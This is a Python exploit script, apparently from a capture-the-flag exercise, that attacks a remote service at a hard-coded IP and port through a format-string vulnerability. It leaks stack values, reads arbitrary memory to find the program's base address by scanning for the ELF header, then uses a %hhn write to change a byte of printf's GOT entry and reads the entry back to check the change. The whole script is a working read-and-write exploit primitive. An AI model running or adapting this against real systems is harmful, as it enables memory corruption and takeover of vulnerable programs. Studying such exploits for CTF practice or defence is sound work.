#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    for _ in range(6):
        d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
        if m: return int(m.group(1))
        time.sleep(0.1)
    return None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    for _ in range(6):
        a15=leak_lld(s,15)
        if a15:
            start=a15&~0xfff
            for d in range(0,0x20000,0x1000):
                r=readmem(s,start-d)
                if r.startswith(b'\x7fELF'): return start-d
    return None

s=newconn(); pie=get_pie(s)
print("pie=",hex(pie))
# printf@got ~ pie+0x3f90
target = pie + 0x3f90
print("target printf@got=",hex(target))
# read it first
before = readmem(s,target)
print("before:", repr(before[:40]))
# write byte 0x41 (65) to target via %8$hhn
# format exactly 16 bytes, addr low 7 bytes at buffer[16:22]
fmt = b"%65c%8$hhn" + b"B"*6  # 10 + 6 = 16 bytes
addr = struct.pack("<Q", target)[:7]  # low 7 bytes, byte7 (0x00) from OOB buffer[23]
payload = fmt + addr
print("payload len", len(payload))
d=ask(s, payload)
print("write =>", repr(d[:60]))
# read back target
after = readmem(s,target)
print("after:", repr(after[:40]))
s.close()
